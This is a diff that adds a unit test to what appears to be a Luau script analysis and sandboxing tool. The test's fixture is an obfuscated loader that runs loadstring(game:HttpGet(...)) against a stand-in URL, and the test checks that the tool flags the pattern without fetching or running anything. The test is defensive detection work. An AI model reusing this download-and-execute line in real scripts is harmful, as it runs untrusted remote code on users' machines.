@@ -129,6 +129,21 @@ class NativeReadabilityTests(unittest.TestCase):
         report, _, _ = self.apply('local function f(loadstring) return loadstring("print(1)") end; return f')
         self.assertEqual(report['embeddedSources'], [])
 
+    def test_host_trace_reconstructs_vm_loader_without_network(self):
+        from host_trace import observe
+        source=self.root/'vm-loader.luau'
+        source.write_text('return(function(...) local a=function()end;local b=function()end;local c=function()end;local d=function()end;local state=1;while state do if state==1 then state=nil;loadstring(game:HttpGet("https://example.invalid/payload.lua"))() end end end)()')
+        report=observe(source,self.root,6)
+        self.assertTrue(report['submittedWrapperExecuted'])
+        self.assertFalse(report['externalEffectsAllowed'])
+        self.assertFalse(report['remoteBodiesFetched'])
+        self.assertFalse(report['remoteBodiesExecuted'])
+        self.assertTrue(report['profilesMatched'],report)
+        self.assertEqual(report.get('pattern'),'httpget-loadstring-call')
+        artifact=self.root/report['behavioralArtifact']
+        self.assertIn('https://example.invalid/payload.lua',artifact.read_text())
+        self.assertIn('loadstring(game:HttpGet',artifact.read_text())
+
     def test_no_application_execution_for_infinite_loop(self):
         source = self.root / 'input.luau'; source.write_text('local s="\\104"; while true do end')
         report = run(source, self.root / 'result', 30)
